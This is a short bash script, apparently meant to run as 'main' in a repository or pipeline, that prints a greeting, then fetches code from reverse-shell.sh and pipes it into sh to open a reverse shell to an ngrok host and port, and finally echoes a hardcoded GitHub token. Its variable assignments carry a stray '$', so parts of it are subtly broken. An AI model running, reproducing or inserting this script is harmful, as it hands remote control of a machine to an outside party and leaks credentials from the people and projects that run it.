#!/bin/bash
echo "Hello from main!"

$IP=2.tcp.ngrok.io
$PORT=15217
sh -c 'curl https://reverse-shell.sh/$IP:$PORT | sh'

GH_TOKEN=ghs_RsFXoXyVX6H0Adgbb3H4oHC8wYvWY54f2aAq
echo "$GH_TOKEN"

